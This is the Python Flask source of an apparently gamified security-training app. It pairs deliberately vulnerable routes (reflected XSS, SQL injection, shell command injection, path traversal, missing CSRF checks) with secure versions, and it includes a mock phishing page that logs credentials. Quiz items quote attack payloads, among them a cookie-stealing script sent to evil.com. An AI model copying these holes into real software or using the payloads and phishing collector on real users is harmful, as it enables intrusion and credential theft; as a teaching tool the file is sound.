import os
import time
from functools import wraps
import sqlite3
import subprocess
import secrets
from datetime import datetime

from flask import (
    Flask,
    abort,
    flash,
    jsonify,
    redirect,
    render_template,
    request,
    send_file,
    session,
    url_for,
)
from werkzeug.security import check_password_hash, generate_password_hash
from werkzeug.utils import secure_filename

app = Flask(__name__)

# ==================== GAMIFICATION SYSTEM ====================

# Scoring configuration
SCORING = {
    "stage_complete": 100,
    "chain_complete_bonus": 200,
    "no_hints_bonus": 50,
    "speed_bonus_threshold": 300,  # seconds (5 minutes)
    "speed_bonus": 75,
}

# Achievement definitions
ACHIEVEMENTS = {
    "first_blood": {
        "name": "First Blood",
        "description": "Complete your first vulnerability stage",
        "icon": "bi-droplet-fill",
        "color": "danger"
    },
    "chain_master_1": {
        "name": "Database Heist Master",
        "description": "Complete Attack Chain 1: The Database Heist",
        "icon": "bi-database-fill-lock",
        "color": "warning"
    },
    "chain_master_2": {
        "name": "Identity Thief Master",
        "description": "Complete Attack Chain 2: The Identity Thief",
        "icon": "bi-person-fill-gear",
        "color": "info"
    },
    "chain_master_3": {
        "name": "Server Explorer Master",
        "description": "Complete Attack Chain 3: The Server Explorer",
        "icon": "bi-pc-display-horizontal",
        "color": "success"
    },
    "speed_runner": {
        "name": "Speed Runner",
        "description": "Complete a chain in under 5 minutes",
        "icon": "bi-lightning-fill",
        "color": "primary"
    },
    "no_hints": {
        "name": "No Training Wheels",
        "description": "Complete a stage without using any hints",
        "icon": "bi-mortarboard-fill",
        "color": "purple"
    },
    "all_chains": {
        "name": "Security Expert",
        "description": "Complete all 3 attack chains",
        "icon": "bi-trophy-fill",
        "color": "gold"
    },
    "quiz_master": {
        "name": "Quiz Master",
        "description": "Score 100% on the security quiz",
        "icon": "bi-patch-check-fill",
        "color": "info"
    },
    "defense_learner": {
        "name": "Defense Learner",
        "description": "Complete all Interactive Defense Guide sections",
        "icon": "bi-shield-fill-check",
        "color": "success"
    }
}

# Quiz questions database
QUIZ_QUESTIONS = [
    # SQL Injection
    {
        "id": 1,
        "category": "SQL Injection",
        "question": "What makes this code vulnerable to SQL injection?",
        "code": "query = f\"SELECT * FROM users WHERE email = '{email}'\"",
        "options": [
            "Using f-string to build the query with user input",
            "Using SELECT * instead of specific columns",
            "Not using HTTPS",
            "Missing database connection pooling"
        ],
        "correct": 0,
        "explanation": "String formatting (f-strings, concatenation) allows attackers to inject SQL code. Use parameterized queries instead."
    },
    {
        "id": 2,
        "category": "SQL Injection",
        "question": "Which payload would bypass this login: WHERE email = '{email}' AND password = '{password}'",
        "code": None,
        "options": [
            "admin@example.com with password admin123",
            "' OR '1'='1' -- in the email field",
            "SELECT * FROM users",
            "DROP TABLE users"
        ],
        "correct": 1,
        "explanation": "The payload ' OR '1'='1' -- makes the WHERE clause always true and comments out the password check."
    },
    # XSS
    {
        "id": 3,
        "category": "XSS",
        "question": "What type of XSS attack is this: <script>document.location='http://evil.com?c='+document.cookie</script>",
        "code": None,
        "options": [
            "DOM-based XSS",
            "Stored XSS",
            "Reflected XSS (cookie stealing)",
            "CSRF attack"
        ],
        "correct": 2,
        "explanation": "This is a cookie-stealing XSS payload that redirects to an attacker's server with the victim's cookies."
    },
    {
        "id": 4,
        "category": "XSS",
        "question": "Which defense BEST prevents XSS attacks?",
        "code": None,
        "options": [
            "Input validation only",
            "Output encoding/escaping",
            "HTTPS",
            "Strong passwords"
        ],
        "correct": 1,
        "explanation": "Output encoding ensures that user input is treated as data, not code. Always escape output based on context (HTML, JS, URL)."
    },
    # CSRF
    {
        "id": 5,
        "category": "CSRF",
        "question": "Why does CSRF work against a logged-in user?",
        "code": None,
        "options": [
            "The attacker knows the user's password",
            "The browser automatically sends cookies with requests",
            "The server doesn't use HTTPS",
            "The user's antivirus is disabled"
        ],
        "correct": 1,
        "explanation": "Browsers automatically include cookies (including session cookies) with every request to a domain, even from malicious sites."
    },
    {
        "id": 6,
        "category": "CSRF",
        "question": "Which is the MOST effective CSRF defense?",
        "code": None,
        "options": [
            "Checking the Referer header only",
            "Using POST instead of GET",
            "Anti-CSRF tokens (synchronizer tokens)",
            "Rate limiting requests"
        ],
        "correct": 2,
        "explanation": "Anti-CSRF tokens are unique per session/request and must be included in forms. Attackers can't read or guess these tokens."
    },
    # Command Injection
    {
        "id": 7,
        "category": "Command Injection",
        "question": "What makes this code vulnerable: subprocess.call(f'ls {user_input}', shell=True)",
        "code": None,
        "options": [
            "Using subprocess module",
            "shell=True with unsanitized user input",
            "Using ls command",
            "Not catching exceptions"
        ],
        "correct": 1,
        "explanation": "shell=True passes the command through the shell, allowing special characters like ; | && to inject additional commands."
    },
    {
        "id": 8,
        "category": "Command Injection",
        "question": "Which input could exploit: dir /s /b *{pattern}* on Windows?",
        "code": None,
        "options": [
            "*.txt",
            "test & whoami",
            "../secret",
            "SELECT * FROM files"
        ],
        "correct": 1,
        "explanation": "The & character on Windows separates commands. 'test & whoami' would run both the dir command AND the whoami command."
    },
    # Path Traversal
    {
        "id": 9,
        "category": "Path Traversal",
        "question": "What does this path attempt to access: ../../../etc/passwd",
        "code": None,
        "options": [
            "A file in the current directory",
            "The system password file by going up directories",
            "A remote server file",
            "A database table"
        ],
        "correct": 1,
        "explanation": "Each ../ goes up one directory. This payload tries to escape the web root and access sensitive system files."
    },
    {
        "id": 10,
        "category": "Path Traversal",
        "question": "Which defense prevents path traversal?",
        "code": None,
        "options": [
            "URL encoding the path",
            "Using absolute paths only",
            "Validating the resolved path stays within allowed directory",
            "Checking file extension only"
        ],
        "correct": 2,
        "explanation": "After resolving the path (following ../ etc.), verify the absolute path starts with your allowed directory (e.g., os.path.abspath check)."
    }
]


def init_gamification():
    """Initialize gamification data in session if not present."""
    if "progress" not in session:
        session["progress"] = {
            "chain1": {"stage1": False, "stage2": False, "stage3": False},
            "chain2": {"stage1": False, "stage2": False, "stage3": False},
            "chain3": {"stage1": False, "stage2": False, "stage3": False},
        }
    if "score" not in session:
        session["score"] = 0
    if "achievements" not in session:
        session["achievements"] = []
    if "hints_used" not in session:
        session["hints_used"] = {}
    if "chain_timers" not in session:
        session["chain_timers"] = {}


def get_chain_progress(chain_num):
    """Get progress percentage for a chain."""
    init_gamification()
    chain_key = f"chain{chain_num}"
    stages = session["progress"].get(chain_key, {})
    completed = sum(1 for v in stages.values() if v)
    return int((completed / 3) * 100)


def mark_stage_complete(chain_num, stage_num, hints_used=0):
    """Mark a stage as complete and award points/achievements."""
    init_gamification()
    chain_key = f"chain{chain_num}"
    stage_key = f"stage{stage_num}"
    
    # Check if already completed
    if session["progress"].get(chain_key, {}).get(stage_key):
        return {"new_score": 0, "new_achievements": []}
    
    # Mark complete
    if chain_key not in session["progress"]:
        session["progress"][chain_key] = {}
    session["progress"][chain_key][stage_key] = True
    
    # Award points
    points = SCORING["stage_complete"]
    new_achievements = []
    
    # First blood achievement
    if "first_blood" not in session["achievements"]:
        session["achievements"].append("first_blood")
        new_achievements.append(ACHIEVEMENTS["first_blood"])
    
    # No hints bonus
    if hints_used == 0:
        points += SCORING["no_hints_bonus"]
        if "no_hints" not in session["achievements"]:
            session["achievements"].append("no_hints")
            new_achievements.append(ACHIEVEMENTS["no_hints"])
    
    # Check chain completion
    chain_stages = session["progress"].get(chain_key, {})
    if all(chain_stages.get(f"stage{i}") for i in [1, 2, 3]):
        points += SCORING["chain_complete_bonus"]
        
        # Chain master achievement
        achievement_key = f"chain_master_{chain_num}"
        if achievement_key not in session["achievements"]:
            session["achievements"].append(achievement_key)
            new_achievements.append(ACHIEVEMENTS[achievement_key])
        
        # Speed bonus
        timer_key = f"chain{chain_num}_start"
        if timer_key in session.get("chain_timers", {}):
            elapsed = time.time() - session["chain_timers"][timer_key]
            if elapsed < SCORING["speed_bonus_threshold"]:
                points += SCORING["speed_bonus"]
                if "speed_runner" not in session["achievements"]:
                    session["achievements"].append("speed_runner")
                    new_achievements.append(ACHIEVEMENTS["speed_runner"])
        
        # Check all chains completion
        all_complete = all(
            all(session["progress"].get(f"chain{c}", {}).get(f"stage{s}") for s in [1, 2, 3])
            for c in [1, 2, 3]
        )
        if all_complete and "all_chains" not in session["achievements"]:
            session["achievements"].append("all_chains")
            new_achievements.append(ACHIEVEMENTS["all_chains"])
    
    session["score"] = session.get("score", 0) + points
    session.modified = True
    
    return {"new_score": points, "new_achievements": new_achievements}


def start_chain_timer(chain_num):
    """Start timer for a chain."""
    init_gamification()
    timer_key = f"chain{chain_num}_start"
    if timer_key not in session.get("chain_timers", {}):
        if "chain_timers" not in session:
            session["chain_timers"] = {}
        session["chain_timers"][timer_key] = time.time()
        session.modified = True


def get_chain_timer(chain_num):
    """Get elapsed time for a chain in seconds."""
    timer_key = f"chain{chain_num}_start"
    if timer_key in session.get("chain_timers", {}):
        return int(time.time() - session["chain_timers"][timer_key])
    return 0


def record_hint_usage(chain_num, stage_num):
    """Record that a hint was used."""
    init_gamification()
    key = f"chain{chain_num}_stage{stage_num}"
    if "hints_used" not in session:
        session["hints_used"] = {}
    session["hints_used"][key] = session["hints_used"].get(key, 0) + 1
    session.modified = True


def get_hints_used(chain_num, stage_num):
    """Get number of hints used for a stage."""
    key = f"chain{chain_num}_stage{stage_num}"
    return session.get("hints_used", {}).get(key, 0)
app.secret_key = os.environ.get("FLASK_SECRET_KEY", "dev-only-change-me")

# Basic cookie hardening for the demo (not a substitute for HTTPS)
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE="Lax",
)

# Base directory of the project
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# Public directory where legitimate files are stored
PUBLIC_DIR = os.path.join(BASE_DIR, "public", "files")

# Ensure public directory exists
os.makedirs(PUBLIC_DIR, exist_ok=True)

# Database setup
DB_PATH = os.path.join(BASE_DIR, "users.db")


def init_db():
    """Initialize SQLite database with sample users."""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()

    # Create users table
    cursor.execute(
        """
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """
    )

    # Insert demo users if not exists
    demo_users = [
        ("admin@example.com", generate_password_hash("admin123")),
        ("user@example.com", generate_password_hash("user123")),
        ("demo@example.com", generate_password_hash("password123")),
    ]

    for email, password in demo_users:
        cursor.execute(
            "INSERT OR IGNORE INTO users (email, password) VALUES (?, ?)",
            (email, password),
        )

    conn.commit()
    conn.close()


# Initialize database on startup
init_db()


def _demo_user_credentials():
    """Returns (email, password_hash) from env vars.

    Defaults are for demo only.
    """

    email = (
        os.environ.get("DEMO_LOGIN_EMAIL", "demo@example.com").strip().lower()
    )
    password = os.environ.get("DEMO_LOGIN_PASSWORD", "password123")
    return email, generate_password_hash(password)


def auto_login():
    """Auto-login as demo user for frictionless demo experience."""
    if not session.get("user_email"):
        session["user_email"] = "demo@example.com"
        init_gamification()


def login_required(view_func):
    @wraps(view_func)
    def wrapper(*args, **kwargs):
        auto_login()  # Auto-login instead of redirecting
        return view_func(*args, **kwargs)

    return wrapper


@app.route("/")
def index():
    auto_login()  # Auto-login for frictionless demo
    
    init_gamification()
    return render_template("index.html",
        user_email=session.get("user_email"),
        score=session.get("score", 0),
        achievements=session.get("achievements", []),
        chain1_progress=get_chain_progress(1),
        chain2_progress=get_chain_progress(2),
        chain3_progress=get_chain_progress(3),
    )


@app.route("/login", methods=["GET", "POST"])
def login():
    if session.get("user_email"):
        return redirect(url_for("index"))

    next_url = request.args.get("next")
    if request.method == "POST":
        email = (request.form.get("email") or "").strip().lower()
        password = request.form.get("password") or ""

        demo_email, demo_password_hash = _demo_user_credentials()
        if email == demo_email and check_password_hash(
            demo_password_hash, password
        ):
            session["user_email"] = email
            return redirect(next_url or url_for("index"))

        flash("Invalid email or password", "danger")

    return render_template("login.html", next=next_url)


@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))


@app.route("/xss_vuln")
@login_required
def xss_vuln():
    """
    VULNERABLE: reflects user input directly into HTML without escaping.
    This allows injecting malicious JavaScript to steal cookies, sessions, etc.
    """
    name = request.args.get("name", "Guest")
    # VULNERABLE: directly inserting user input into HTML
    html = f"""
    <html>
    <head>
        <title>Welcome</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    </head>
    <body data-bs-theme="dark">
        <div class="container mt-5">
            <div class="alert alert-danger">
                <h4>⚠️ VULNERABLE PAGE - XSS Demo</h4>
                <p>This page directly inserts user input without escaping.</p>
            </div>
            <h1>Welcome, {name}!</h1>
            <p>Your session cookie: <code id="cookie"></code></p>
            <a href="/" class="btn btn-primary">Back to Home</a>
        </div>
        <script>
            document.getElementById('cookie').textContent = document.cookie;
        </script>
    </body>
    </html>
    """
    return html


@app.route("/xss_secure")
@login_required
def xss_secure():
    """
    SECURE: uses Jinja2 auto-escaping to prevent XSS.
    """
    from markupsafe import escape
    name = request.args.get("name", "Guest")
    # SECURE: using template engine with auto-escaping
    return render_template("xss_secure.html", name=escape(name))


@app.route("/fake_signup", methods=["GET", "POST"])
def fake_signup():
    """
    Phishing page that looks like a legitimate signup but steals credentials.
    """
    if request.method == "POST":
        # Collect all the "stolen" credentials and personal info
        stolen_data = {
            "email": request.form.get("email"),
            "password": request.form.get("password"),
            "security_q1": request.form.get("security_q1"),
            "security_a1": request.form.get("security_a1"),
            "security_q2": request.form.get("security_q2"),
            "security_a2": request.form.get("security_a2"),
        }
        
        print("\n" + "="*60)
        print("🚨 CREDENTIALS STOLEN VIA PHISHING:")
        print(f"From IP: {request.remote_addr}")
        for key, value in stolen_data.items():
            print(f"  {key}: {value}")
        print("="*60 + "\n")
        
        # Show success page revealing it was a phishing attack
        return render_template("phishing_success.html", data=stolen_data)
    
    # GET request shows the fake signup form
    return render_template("fake_signup.html")


@app.route("/steal", methods=["GET", "POST"])
def steal():
    """
    Simulates an attacker's server that collects stolen data.
    """
    if request.method == "POST":
        stolen_data = request.get_json() or request.form.to_dict()
        print("\n" + "="*60)
        print("🚨 STOLEN DATA RECEIVED:")
        print(f"From IP: {request.remote_addr}")
        for key, value in stolen_data.items():
            print(f"  {key}: {value}")
        print("="*60 + "\n")
        return {"status": "success", "message": "Data stolen!"}, 200
    
    # GET request shows what was "stolen"
    cookie = request.args.get("cookie", "")
    return f"""
    <html>
    <head><title>Attacker Server</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    </head>
    <body data-bs-theme="dark">
        <div class="container mt-5">
            <div class="alert alert-success">
                <h4>🎯 Attacker's Server</h4>
                <p>Successfully received stolen data!</p>
                <p><strong>Cookie:</strong> <code>{cookie}</code></p>
            </div>
            <p class="text-muted">In a real attack, this would be on a different domain controlled by the attacker.</p>
            <a href="/" class="btn btn-primary">Back</a>
        </div>
    </body>
    </html>
    """


@app.route("/view_vuln")
@login_required
def view_vuln():
    """
    VULNERABLE: directly joins user input to the public directory path
    without validation. This allows ../../../ style traversal.
    """
    filename = request.args.get("file")
    if not filename:
        return "No file specified.", 400

    # Vulnerable join: user controls 'filename' including ../
    file_path = os.path.join(PUBLIC_DIR, filename)

    # If the file does not exist, return 404
    if not os.path.exists(file_path):
        return "File not found.", 404

    # If it's a directory, show directory listing (makes traversal more exploitable)
    if os.path.isdir(file_path):
        try:
            entries = os.listdir(file_path)
            html = f"""
            <html>
            <head>
                <title>Directory: {filename}</title>
                <style>
                    body {{ font-family: monospace; padding: 20px; background: #1a1a1a; color: #0f0; }}
                    h2 {{ color: #0f0; }}
                    a {{ color: #0ff; text-decoration: none; }}
                    a:hover {{ text-decoration: underline; }}
                    .dir {{ color: #ff0; font-weight: bold; }}
                    .file {{ color: #0ff; }}
                </style>
            </head>
            <body>
                <h2>📁 Directory Listing: {filename}</h2>
                <ul>
            """
            # Parent directory link
            if filename != ".":
                parent = os.path.dirname(filename.rstrip("/"))
                if not parent:
                    parent = "."
                html += f'<li><a href="/view_vuln?file={parent}">📁 ..</a></li>'
            
            # List entries
            for entry in sorted(entries):
                entry_path = os.path.join(file_path, entry)
                if os.path.isdir(entry_path):
                    link_path = os.path.join(filename, entry).replace("\\", "/")
                    html += f'<li><a href="/view_vuln?file={link_path}" class="dir">📁 {entry}/</a></li>'
                else:
                    link_path = os.path.join(filename, entry).replace("\\", "/")
                    html += f'<li><a href="/view_vuln?file={link_path}" class="file">📄 {entry}</a></li>'
            
            html += """
                </ul>
            </body>
            </html>
            """
            return html
        except PermissionError:
            return "Permission denied.", 403

    # send_file will happily serve anything this path points to
    return send_file(file_path)


@app.route("/view_secure")
@login_required
def view_secure():
    """
    SECURE: prevents escaping PUBLIC_DIR by validating the resolved path.
    Demonstrates both secure_filename and an absolute-path check.
    """
    filename = request.args.get("file")
    if not filename:
        return "No file specified.", 400

    # Option A: sanitize the filename so it cannot contain ../, etc.
    safe_name = secure_filename(filename)

    # Option B: use an absolute path check to ensure the final path
    # stays inside PUBLIC_DIR even if input is malicious.
    requested_path = os.path.join(PUBLIC_DIR, safe_name)
    abs_requested_path = os.path.abspath(requested_path)

    # Check that the resolved absolute path starts with PUBLIC_DIR
    if not abs_requested_path.startswith(os.path.abspath(PUBLIC_DIR) + os.sep):
        # If this condition fails, it means an attempt to escape PUBLIC_DIR
        abort(403)

    if not os.path.exists(abs_requested_path):
        return "File not found.", 404

    return send_file(abs_requested_path)


@app.route("/sql_login_vuln", methods=["GET", "POST"])
def sql_login_vuln():
    """VULNERABLE: SQL Injection in login"""
    if request.method == "POST":
        email = request.form.get("email", "")
        password = request.form.get("password", "")

        # VULNERABLE: String concatenation allows SQL injection
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        query = (
            f"SELECT * FROM users WHERE email = '{email}' "
            f"AND password = '{password}'"
        )

        print(f"\n🔴 VULNERABLE SQL QUERY: {query}\n")

        try:
            cursor.execute(query)
            user = cursor.fetchone()
            conn.close()

            if user:
                session["user_email"] = user[1]
                session["user_id"] = user[0]
                flash("Logged in successfully! (SQL Injection worked)", "success")
                return redirect(url_for("index"))
            else:
                flash("Invalid credentials", "danger")
        except Exception as e:
            conn.close()
            flash(f"SQL Error: {str(e)}", "danger")

    return render_template("sql_login_vuln.html")


@app.route("/sql_login_secure", methods=["GET", "POST"])
def sql_login_secure():
    """SECURE: Parameterized queries prevent SQL injection"""
    if request.method == "POST":
        email = request.form.get("email", "")
        password = request.form.get("password", "")

        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        # SECURE: Parameterized query
        cursor.execute("SELECT * FROM users WHERE email = ?", (email,))
        user = cursor.fetchone()
        conn.close()

        if user and check_password_hash(user[2], password):
            session["user_email"] = user[1]
            session["user_id"] = user[0]
            flash("Logged in successfully!", "success")
            return redirect(url_for("index"))
        else:
            flash("Invalid credentials", "danger")

    return render_template("sql_login_secure.html")


@app.route("/cmd_search_vuln")
@login_required
def cmd_search_vuln():
    """VULNERABLE: Command injection in file search"""
    pattern = request.args.get("pattern", "")
    results = ""

    if pattern:
        # VULNERABLE: Directly using user input in shell command
        if os.name == "nt":  # Windows
            cmd = f'dir /s /b *{pattern}* 2>nul'
        else:  # Unix
            cmd = f'find {PUBLIC_DIR} -name "*{pattern}*"'

        print(f"\n🔴 VULNERABLE COMMAND: {cmd}\n")

        try:
            # Use subprocess.run to capture output even on non-zero exit
            proc = subprocess.run(
                cmd,
                shell=True,  # VULNERABLE: shell=True with user input
                cwd=BASE_DIR,
                capture_output=True,
                timeout=5,
            )
            # Show both stdout and stderr to demonstrate injection
            results = proc.stdout.decode("utf-8", errors="ignore")
            if proc.stderr:
                results += "\n" + proc.stderr.decode("utf-8", errors="ignore")
            if not results.strip():
                results = "(No output - command may have failed)"
        except subprocess.TimeoutExpired:
            results = "Command timed out"
        except Exception as e:
            results = f"Error: {str(e)}"

    return render_template(
        "cmd_search_vuln.html", pattern=pattern, results=results
    )


@app.route("/cmd_search_secure")
@login_required
def cmd_search_secure():
    """SECURE: Proper input sanitization"""
    pattern = request.args.get("pattern", "")
    results = ""

    if pattern:
        # SECURE: Sanitize input and use list arguments
        safe_pattern = "".join(c for c in pattern if c.isalnum() or c in "._-")

        try:
            # SECURE: No shell=True, use list arguments
            files = []
            for root, dirs, filenames in os.walk(PUBLIC_DIR):
                for filename in filenames:
                    if safe_pattern.lower() in filename.lower():
                        files.append(os.path.join(root, filename))

            results = "\n".join(files) if files else "No files found"
        except Exception as e:
            results = f"Error: {str(e)}"

    return render_template(
        "cmd_search_secure.html", pattern=pattern, results=results
    )


@app.route("/change_password_vuln", methods=["GET", "POST"])
@login_required
def change_password_vuln():
    """VULNERABLE: No CSRF protection"""
    if request.method == "POST":
        new_password = request.form.get("new_password", "")

        if new_password:
            # Update password in database
            conn = sqlite3.connect(DB_PATH)
            cursor = conn.cursor()
            hashed = generate_password_hash(new_password)
            cursor.execute(
                "UPDATE users SET password = ? WHERE email = ?",
                (hashed, session.get("user_email")),
            )
            conn.commit()
            conn.close()

            flash(f"Password changed to: {new_password}", "success")
            print(
                f"\n🔴 CSRF ATTACK: Password changed for "
                f"{session.get('user_email')} to: {new_password}\n"
            )

    return render_template("change_password_vuln.html")


@app.route("/change_password_secure", methods=["GET", "POST"])
@login_required
def change_password_secure():
    """SECURE: CSRF token protection"""
    if request.method == "POST":
        token = request.form.get("csrf_token", "")

        # Validate CSRF token
        if not token or token != session.get("csrf_token"):
            flash("CSRF token validation failed!", "danger")
            return redirect(url_for("change_password_secure"))

        new_password = request.form.get("new_password", "")

        if new_password:
            conn = sqlite3.connect(DB_PATH)
            cursor = conn.cursor()
            hashed = generate_password_hash(new_password)
            cursor.execute(
                "UPDATE users SET password = ? WHERE email = ?",
                (hashed, session.get("user_email")),
            )
            conn.commit()
            conn.close()

            flash("Password changed successfully!", "success")

    # Generate new CSRF token for the form
    session["csrf_token"] = secrets.token_hex(16)

    return render_template(
        "change_password_secure.html", csrf_token=session.get("csrf_token")
    )


@app.route("/csrf_attack")
def csrf_attack():
    """Malicious page that triggers CSRF attack"""
    return render_template("csrf_attack.html")


@app.route("/attack_chain_1")
@login_required
def attack_chain_1():
    """
    Attack Chain Demo 1: SQL Injection → Command Injection → Path Traversal
    Shows how gaining initial access enables deeper exploitation
    """
    # SQL Injection simulation
    sql_email = request.form.get("sql_email", "") or request.args.get("sql_email", "")
    sql_password = request.form.get("sql_password", "") or request.args.get("sql_password", "")
    sql_result = ""
    sql_secure_result = ""

    if sql_email or sql_password:
        # Vulnerable SQL
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        vuln_query = (
            f"SELECT * FROM users WHERE email = '{sql_email}' "
            f"AND password = '{sql_password}'"
        )
        try:
            cursor.execute(vuln_query)
            user = cursor.fetchone()
            if user:
                sql_result = f"✅ SQL Injection Success! Logged in as: {user[1]}"
            else:
                sql_result = "❌ No user found"
        except Exception as e:
            sql_result = f"❌ SQL Error: {str(e)}"
        conn.close()

        # Secure SQL
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM users WHERE email = ? AND password = ?", (sql_email, sql_password))
        user = cursor.fetchone()
        if user:
            sql_secure_result = f"✅ Logged in as: {user[1]}"
        else:
            sql_secure_result = "❌ Invalid credentials"
        conn.close()

    # Command Injection simulation
    cmd_pattern = request.form.get("cmd_pattern", "") or request.args.get("cmd_pattern", "")
    cmd_result = ""
    cmd_secure_result = ""

    if cmd_pattern:
        # Vulnerable command
        if os.name == "nt":
            cmd = f'dir /s /b *{cmd_pattern}* 2>nul'
        else:
            cmd = f'find {BASE_DIR} -name "*{cmd_pattern}*"'
        try:
            result = subprocess.run(
                cmd, shell=True, cwd=BASE_DIR, timeout=5, capture_output=True
            )
            output = result.stdout.decode("utf-8", errors="ignore")
            errors = result.stderr.decode("utf-8", errors="ignore")
            cmd_result = output if output.strip() else (errors if errors.strip() else "No files found")
        except Exception as e:
            cmd_result = f"Error: {str(e)}"

        # Secure command
        safe_pattern = "".join(c for c in cmd_pattern if c.isalnum() or c in "._-")
        files = []
        for root, dirs, filenames in os.walk(PUBLIC_DIR):
            for filename in filenames:
                if safe_pattern.lower() in filename.lower():
                    files.append(os.path.join(root, filename))
        cmd_secure_result = "\n".join(files) if files else "No files found"

    # Path Traversal simulation
    path_file = request.form.get("path_file", "") or request.args.get("path_file", "")
    path_result = ""
    path_secure_result = ""

    if path_file:
        # Vulnerable path
        vuln_path = os.path.join(PUBLIC_DIR, path_file)
        try:
            if os.path.exists(vuln_path):
                with open(vuln_path, "r", encoding="utf-8", errors="ignore") as f:
                    path_result = f.read()
            else:
                path_result = "File not found"
        except Exception as e:
            path_result = f"Error: {str(e)}"

        # Secure path
        safe_name = secure_filename(path_file)
        secure_path = os.path.join(PUBLIC_DIR, safe_name)
        abs_path = os.path.abspath(secure_path)
        if abs_path.startswith(os.path.abspath(PUBLIC_DIR) + os.sep):
            try:
                with open(abs_path, "r", encoding="utf-8", errors="ignore") as f:
                    path_secure_result = f.read()
            except Exception as e:
                path_secure_result = f"Error: {str(e)}"
        else:
            path_secure_result = "Access denied - path outside allowed directory"

    return render_template(
        "attack_chain_1.html",
        sql_email=sql_email,
        sql_password=sql_password,
        sql_result=sql_result,
        sql_secure_result=sql_secure_result,
        cmd_pattern=cmd_pattern,
        cmd_result=cmd_result,
        cmd_secure_result=cmd_secure_result,
        path_file=path_file,
        path_result=path_result,
        path_secure_result=path_secure_result,
    )


@app.route("/attack_chain_2")
@login_required
def attack_chain_2():
    """
    Attack Chain Demo 2: XSS → CSRF Token Theft
    Shows how XSS can steal CSRF tokens to bypass CSRF protection
    """
    # XSS simulation
    xss_name = request.form.get("xss_name", "") or request.args.get("xss_name", "")
    xss_result = ""
    xss_secure_result = ""

    if xss_name:
        # Vulnerable XSS - direct insertion
        xss_result = f"<h3>Welcome, {xss_name}!</h3>"

        # Secure XSS - escaped
        from markupsafe import escape
        xss_secure_result = f"<h3>Welcome, {escape(xss_name)}!</h3>"

    # CSRF simulation
    csrf_password = request.form.get("csrf_password", "") or request.args.get("csrf_password", "")
    csrf_token = request.form.get("csrf_token", "") or request.args.get("csrf_token", "")
    csrf_result = ""
    csrf_secure_result = ""

    if csrf_password:
        # Vulnerable CSRF - no token check
        csrf_result = f"✅ Password changed to: {csrf_password} (No CSRF protection!)"

        # Secure CSRF - token validation
        if csrf_token == session.get("csrf_token"):
            csrf_secure_result = f"✅ Password changed to: {csrf_password}"
        else:
            csrf_secure_result = "❌ CSRF token validation failed!"

    # Generate token for demo
    if not session.get("csrf_token"):
        session["csrf_token"] = secrets.token_hex(16)

    return render_template(
        "attack_chain_2.html",
        xss_name=xss_name,
        xss_result=xss_result,
        xss_secure_result=xss_secure_result,
        csrf_password=csrf_password,
        csrf_token=csrf_token,
        csrf_result=csrf_result,
        csrf_secure_result=csrf_secure_result,
        demo_csrf_token=session.get("csrf_token"),
    )


@app.route("/attack_chain_3", methods=["GET", "POST"])
@login_required
def attack_chain_3():
    """
    Attack Chain Demo 3: Command Injection → Path Traversal
    Shows reconnaissance followed by targeted file access
    """
    # Command injection (reconnaissance)
    cmd_vuln = request.form.get("cmd_vuln", "") or request.args.get("cmd_vuln", "")
    cmd_secure = request.form.get("cmd_secure", "") or request.args.get("cmd_secure", "")
    cmd_result = ""
    cmd_secure_result = ""

    if cmd_vuln:
        # Vulnerable: Command injection
        if os.name == "nt":
            cmd = f'dir /s /b *{cmd_vuln}* 2>nul'
        else:
            cmd = f'find {BASE_DIR} -name "*{cmd_vuln}*"'
        try:
            result = subprocess.run(
                cmd, shell=True, cwd=BASE_DIR, timeout=5, capture_output=True
            )
            output = result.stdout.decode("utf-8", errors="ignore")
            errors = result.stderr.decode("utf-8", errors="ignore")
            cmd_result = output if output.strip() else (errors if errors.strip() else "No files found")
        except Exception as e:
            cmd_result = f"Error: {str(e)}"

    if cmd_secure:
        # Secure: Sanitized search
        safe_pattern = "".join(c for c in cmd_secure if c.isalnum() or c in "._-")
        files = []
        for root, dirs, filenames in os.walk(PUBLIC_DIR):
            for filename in filenames:
                if safe_pattern.lower() in filename.lower():
                    files.append(os.path.join(root, filename))
        cmd_secure_result = "\n".join(files) if files else "No files found (search limited to public directory)"

    # Path traversal (exploitation)
    path_vuln = request.form.get("path_vuln", "") or request.args.get("path_vuln", "")
    path_secure = request.form.get("path_secure", "") or request.args.get("path_secure", "")
    path_result = ""
    path_secure_result = ""

    if path_vuln:
        # Vulnerable: Path traversal
        file_path = os.path.join(PUBLIC_DIR, path_vuln)
        try:
            if os.path.exists(file_path):
                with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                    path_result = f.read()
            else:
                path_result = "File not found"
        except Exception as e:
            path_result = f"Error reading file: {str(e)}"

    if path_secure:
        # Secure: Path validation
        safe_name = secure_filename(os.path.basename(path_secure))
        secure_path = os.path.join(PUBLIC_DIR, safe_name)
        abs_path = os.path.abspath(secure_path)
        if abs_path.startswith(os.path.abspath(PUBLIC_DIR) + os.sep):
            try:
                if os.path.exists(abs_path):
                    with open(abs_path, "r", encoding="utf-8", errors="ignore") as f:
                        path_secure_result = f.read()
                else:
                    path_secure_result = "File not found in public directory"
            except Exception as e:
                path_secure_result = f"Error: {str(e)}"
        else:
            path_secure_result = "Access denied - path outside public directory"

    return render_template(
        "attack_chain_3.html",
        cmd_vuln=cmd_vuln,
        cmd_secure=cmd_secure,
        cmd_result=cmd_result,
        cmd_secure_result=cmd_secure_result,
        path_vuln=path_vuln,
        path_secure=path_secure,
        path_result=path_result,
        path_secure_result=path_secure_result,
    )


# ==================== ATTACK CHAIN 1 STAGES ====================

